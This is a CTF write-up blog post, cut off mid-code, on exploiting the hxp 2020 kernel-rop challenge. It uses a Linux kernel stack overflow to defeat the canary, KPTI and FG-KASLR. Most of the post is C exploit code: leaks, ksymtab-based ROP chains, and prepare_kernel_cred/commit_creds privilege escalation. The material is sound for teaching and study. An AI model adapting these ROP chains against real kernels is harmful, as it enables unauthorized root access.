<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Kernel-ROP hxp 2020
        
    </title><meta content="Kernel-ROP hxp 2020" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/kernel-rop/&t=Kernel-ROP hxp 2020"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Kernel-ROP hxp 2020<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2021-03-01</time></div></div><section class=body><h1 id=tl-dr>tl;dr</h1><ul><li>Use the kernel Buffer overflow to defeat the hottest kernel defences.</ul><h1 id=reversing>Reversing</h1><p>The bof bug is in the plain sight (exercise for the reader to find out) so there's nothing really to reverse in this.<h1 id=setting-up-the-debug-environment>Setting up the debug environment</h1><ul><li>Extract the <code>initramfs.cpio.gz</code> with -</ul><pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gunzip</span><span> initramfs.cpio.gz
</span><span style=color:#ffb454>mkdir</span><span> rootfs </span><span style=color:#f29668>&& </span><span style=color:#f07178>cd</span><span> rootfs
</span><span style=color:#ffb454>cat</span><span> ../initramfs.cpio </span><span style=color:#f29668>| </span><span style=color:#ffb454>cpio</span><span style=color:#f29718> --extract
</span></code></pre><ul><li>Edit the <code>rcS</code> script at <code>/etc/init.d</code> and change the <code>uid</code> of the user to <code>0</code> with <code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>.<li>Also, comment out the <code>echo 1</code> happening on <code>dmesg</code> and <code>kptr</code>. This is to view module base address and <code>/proc/kallsyms</code> also.<li>Finally, pack the initramfs with</ul><pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>find</span><span> . </span><span style=color:#f29668>| </span><span style=color:#ffb454>cpio</span><span style=color:#f29718> -o -H</span><span> newc </span><span style=color:#f29668>></span><span> ../initramfs.cpio
</span><span style=color:#f07178>cd</span><span> ..
</span><span style=color:#ffb454>gzip</span><span style=color:#f29718> -f</span><span> initramfs.cpio
</span></code></pre><ul><li>You can also edit the <code>rcS</code> init script to calculate addresses of useful functions for you right at the beginning.</ul><h1 id=exploit-development>Exploit development</h1><h2 id=multiple-memory-leaks>Multiple Memory Leaks</h2><p>In my previous post, I have discussed about all the mitigations which are enabled in this challenge. The most annoying of them are the <code>SMAP</code> (ROP only in the kernel land) and the <code>FG-KASLR</code> (Randomize individual functions).<p>Hence, to leak memory, we first have to find addresses of the functions which are not effected by <code>FG-KASLR</code> (we're lucky that this mitigation doesnt randomize every kernel function).<ul><li>The functions from <code>_text</code> (kernel image base) to <code>__x86_retpoline_r15</code> (image base + 0x400dc6) are all uneffected by FG-KASLR.<li><code>commit_creds</code> and <code>prepare_kernel_cred</code> do not lie in this region and hence we can't proceed directly.<li><code>swapgs_restore_regs_and_return_to_usermode</code> is the function which sweetly defeats the <code>KPTI</code> (separation of page tables in the kernel and usermode) mitigation and thus allowing us to return to userland. To our relief, this function is also uneffected by FG-KASLR. For simplicity we will call this function as <code>kpti trampoline</code>.</ul><p>So, how do we leak <code>commit_creds</code> and <code>prepare_kernel_cred</code>?<h2 id=leaking-through-ksymtab>Leaking through ksymtab</h2><p>Each of these functions (commit_creds and prepare_kernel_cred) have a kernel symbol table into which their offset is stored from the kernel base.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>struct</span><span> kernel_symbol {
</span><span>	  int value_offset;
</span><span>	  int name_offset;
</span><span>	  int namespace_offset;
</span><span>}</span><span style=color:#f29668>;
</span></code></pre><p>On inspection, we find that the symbol table functions are not effected by FG-KASLR.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>cat</span><span> /proc/kallsyms </span><span style=color:#f29668>| </span><span style=color:#ffb454>grep</span><span> ksymtab_commit_creds
</span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> ffffffffb7f87d90 r __ksymtab_commit_creds
</span><span style=color:#ffb454>cat</span><span> /proc/kallsyms </span><span style=color:#f29668>| </span><span style=color:#ffb454>grep</span><span> ksymtab_prepare_kernel_cred
</span><span style=color:#ffb454>-</span><span style=color:#f29668>></span><span> ffffffffb7f8d4fc r __ksymtab_prepare_kernel_cred
</span></code></pre><p>Hence , we can read the offset value of each of these symbol tables and get the addresses of the actual functions thus completely bypassing <code>FG-KASLR</code>.<h2 id=getting-necessary-leaks>Getting necessary Leaks</h2><p>Since we can read from the entire stack, we can find a lot of kernel pointers on the stack from which we can obtain kernel base.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>get_leak</span><span>(</span><span style=color:#ff7733>void</span><span>){
</span><span>    </span><span style=color:#ff7733>unsigned</span><span> n </span><span style=color:#f29668>= </span><span style=color:#f29718>40</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>unsigned long</span><span> leak[n]</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span> leak</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>sizeof</span><span>(leak))</span><span style=color:#bfbab0cc>;
</span><span>    canary </span><span style=color:#f29668>=</span><span> leak[</span><span style=color:#f29718>16</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>    image_base </span><span style=color:#f29668>=</span><span> leak[</span><span style=color:#f29718>38</span><span>] </span><span style=color:#f29668>- </span><span style=color:#f29718>0xa157</span><span style=color:#ff7733>ULL</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[+] canary -> 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>canary)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[+] image_base -> 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>image_base)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>Since canary is also enabled, we leak it as well. From here , we can also offset to a few useful gadgets and functions like <code>kpti trampoline</code>.<h2 id=leaking-commit-creds>Leaking commit_creds</h2><ul><li>A few things differ from userland to kernel land buffer overflows, the very first of them is the registers popped at the end of a function. Here, we have the <code>canary</code> followed by <code>rbx</code>, <code>r12</code> and <code>rbp</code> being popped before getting to <code>rip</code>.<li>Our overflow starts immediately from overwriting <code>canary</code>.<li>So , let's script it now.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>get_cred</span><span>(</span><span style=color:#ff7733>void</span><span>){
</span><span>    </span><span style=color:#ff7733>unsigned</span><span> n </span><span style=color:#f29668>= </span><span style=color:#f29718>50</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>unsigned long</span><span> payload[n]</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>unsigned</span><span> off </span><span style=color:#f29668>= </span><span style=color:#f29718>16</span><span style=color:#bfbab0cc>;
</span><span>    ksymtab_prepare_kernel_cred </span><span style=color:#f29668>=</span><span> image_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xf8d4fc</span><span style=color:#ff7733>UL</span><span style=color:#bfbab0cc>;
</span><span>    ksymtab_commit_creds </span><span style=color:#f29668>=</span><span> image_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xf87d90</span><span style=color:#ff7733>UL</span><span style=color:#bfbab0cc>;
</span><span>    kpti_trampoline </span><span style=color:#f29668>=</span><span> image_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x200f10</span><span style=color:#ff7733>UL </span><span style=color:#f29668>+ </span><span style=color:#f29718>22</span><span style=color:#ff7733>UL</span><span style=color:#bfbab0cc>;
</span><span>    pop_rax_ret </span><span style=color:#f29668>=</span><span> image_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x4d11</span><span style=color:#ff7733>UL</span><span style=color:#bfbab0cc>;
</span><span>    mov_rax_rax_16_rbp </span><span style=color:#f29668>=</span><span> image_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x4aad</span><span style=color:#ff7733>UL</span><span style=color:#bfbab0cc>;
</span><span>
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> canary</span><span style=color:#bfbab0cc>;
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0x0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// rbx
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0x0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// r12
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0x0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// rbp
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> pop_rax_ret</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// return address
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> ksymtab_commit_creds </span><span style=color:#f29668>- </span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// rax &LT- __ksymtabs_commit_creds - 0x10
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> mov_rax_rax_16_rbp</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// rax &LT- [__ksymtabs_commit_creds -> offset]
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0x0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// dummy rbp
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> kpti_trampoline</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// swapgs_restore_regs_and_return_to_usermode + 22
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0x0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// dummy rax
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0x0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// dummy rdi
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>unsigned long</span><span>)leak_cred</span><span style=color:#bfbab0cc>;
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_cs</span><span style=color:#bfbab0cc>;
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_rflags</span><span style=color:#bfbab0cc>;
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_sp</span><span style=color:#bfbab0cc>;
</span><span>    payload[off</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_ss</span><span style=color:#bfbab0cc>;
</span><span>
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[*] Prepared payload to leak commit_creds()"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=font-style:italic;color:#39bae6>ssize_t</span><span> w </span><span style=color:#f29668>= </span><span style=color:#ffb454>write</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span> payload</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>sizeof</span><span>(payload))</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[!] Should never be reached"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><ul><li>To get <code>offset</code> of <code>ksymtab_commit_creds</code>, we have used a gadget which is <code>mov rax, qword [rax+16] ; ret</code> and hence we pass <code>ksymtab_commit_creds-0x10</code>.<li>To return to a userland function, we first have to call our <code>kpti_trampoline</code>. This function initially has a lots of popping of registers and so we skip that with eyes closed.<li>Finally, we set <code>leak_cred</code> as our userland function and restore all the <code>EFLAGS</code> for smooth return to userland.<li>The <code>EFLAGS</code> are preserved by us by calling a special function before anything else, which is our <code>save_state</code> function which stores all the <code>EFLAGS</code> so that we can reuse them for returning to the userland.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
</span><span style=color:#ff7733>void </span><span style=color:#ffb454>save_state</span><span>(){
</span><span>    </span><span style=color:#ff7733>__asm__</span><span>(
</span><span>        </span><span style=color:#c2d94c>".intel_syntax noprefix;"
</span><span>        </span><span style=color:#c2d94c>"mov user_cs, cs;"
</span><span>        </span><span style=color:#c2d94c>"mov user_ss, ss;"
</span><span>        </span><span style=color:#c2d94c>"mov user_sp, rsp;"
</span><span>        </span><span style=color:#c2d94c>"pushf;"
</span><span>        </span><span style=color:#c2d94c>"pop user_rflags;"
</span><span>        </span><span style=color:#c2d94c>".att_syntax;"
</span><span>    )</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[*] Saved state"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><h3 id=get-creds>get_creds</h3><p>With some inline assembly , we can directly move the value of <code>rax</code> which now has the offset of our <code>commit_creds</code> into a global variable.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>leak_cred</span><span>(){
</span><span>    </span><span style=font-style:italic;color:#5c6773>//using inline assembly to store value of rax into a temp variable
</span><span>    </span><span style=color:#ff7733>__asm__</span><span>(</span><span style=color:#c2d94c>".intel_syntax noprefix;"
</span><span>            </span><span style=color:#c2d94c>"mov temp_store,rax;"
</span><span>            </span><span style=color:#c2d94c>".att_syntax"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    commit_creds </span><span style=color:#f29668>=</span><span> ksymtab_commit_creds </span><span style=color:#f29668>+ </span><span>(</span><span style=color:#ff7733>int</span><span>)temp_store</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[+] commit_creds -> 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>commit_creds)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>get_pkc</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>Finally , we now call the function to prepare leaking <code>prepare_kernel_cred</code>.<h2 id=leak-prepare-kernel-cred>Leak prepare_kernel_cred</h2><p>With an exact appoach as the previous payload, we can leak prepare_kernel_cred.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>get_pkc</span><span>(){
</span><span>    </span><span style=color:#ff7733>unsigned long</span><span> payload[</span><span style=color:#f29718>50</span><span>] </span><span style=color:#f29668>= </span><span>{</span><span style=color:#f29718>0</span><span>}</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>int</span><span> i</span><span style=color:#f29668>=</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> canary</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rbx
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//r12
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rbp
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> pop_rax_ret</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> ksymtab_prepare_kernel_cred</span><span style=color:#f29668>-</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> mov_rax_rax_16_rbp</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//pop rbp
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> kpti_trampoline</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//pop rax
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//pop rdi
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>unsigned long</span><span>)leak_pkc</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_cs</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_rflags</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_sp</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_ss</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[*] Launching payload to leak prepare_kernel_cred!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>write</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span>payload</span><span style=color:#bfbab0cc>,</span><span style=color:#ff7733>sizeof</span><span>(payload))</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>This time, we pass control to <code>leak_pkc</code> userland function.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
</span><span style=color:#ff7733>void </span><span style=color:#ffb454>leak_pkc</span><span>(){
</span><span>    </span><span style=color:#ff7733>__asm__</span><span>(</span><span style=color:#c2d94c>".intel_syntax noprefix;"
</span><span>            </span><span style=color:#c2d94c>"mov temp_store,rax;"
</span><span>            </span><span style=color:#c2d94c>".att_syntax;"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    prepare_kernel_cred </span><span style=color:#f29668>=</span><span> ksymtab_prepare_kernel_cred </span><span style=color:#f29668>+ </span><span>(</span><span style=color:#ff7733>int</span><span>)temp_store</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[+] prepare_kernel_cred -> 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>prepare_kernel_cred)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>pkc</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>And finally, we leak <code>prepare_kernel_cred</code>.<h2 id=prepare-kernel-cred-0>prepare_kernel_cred(0)</h2><p>We will get to our root shell in 2 stages.<ul><li>First, we will call <code>prepare_kernel_cred(0)</code> and finally store the value of <code>cred_structure</code> into the temporary variable and then call <code>commit_creds</code> on that.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>pkc</span><span>(){
</span><span>    </span><span style=color:#ff7733>unsigned long</span><span> payload[</span><span style=color:#f29718>50</span><span>] </span><span style=color:#f29668>= </span><span>{</span><span style=color:#f29718>0</span><span>}</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>int</span><span> i</span><span style=color:#f29668>=</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>;
</span><span>    pop_rdi </span><span style=color:#f29668>=</span><span> image_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xed00</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[*] pop_rdi = 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>pop_rdi)</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> canary</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rbx
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//r12
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rbp
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> pop_rdi</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//for prepare_kernel_cred(0)
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//gadget is pop rdi ; pop rbp ; ret
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> prepare_kernel_cred</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> kpti_trampoline</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rax
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rdi
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>unsigned long</span><span>)store_rax</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_cs</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_rflags</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_sp</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> user_ss</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>write</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span>payload</span><span style=color:#bfbab0cc>,</span><span style=color:#ff7733>sizeof</span><span>(payload))</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>The control is passed to <code>store_rax</code> function.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>store_rax</span><span>(){
</span><span>    </span><span style=color:#ff7733>__asm__</span><span>(</span><span style=color:#c2d94c>".intel_syntax noprefix;"
</span><span>            </span><span style=color:#c2d94c>"mov temp_store,rax;"
</span><span>            </span><span style=color:#c2d94c>".att_syntax;"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    pkc_struct </span><span style=color:#f29668>=</span><span> temp_store</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"pkc_struct = 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>temp_store)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>cc</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>}
</span><span>
</span></code></pre><p>Finally, after storing <code>cred_struct</code>, we now call <code>commit_creds</code> with our struct as argument.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>cc</span><span>(){
</span><span>    </span><span style=color:#ff7733>unsigned long</span><span> payload[</span><span style=color:#f29718>50</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>int</span><span> i</span><span style=color:#f29668>=</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> canary</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rbx
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//r12
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rbp
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> pop_rdi</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> pkc_struct</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> commit_creds</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> kpti_trampoline</span><span style=color:#bfbab0cc>;
</span><span>    payload[i</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
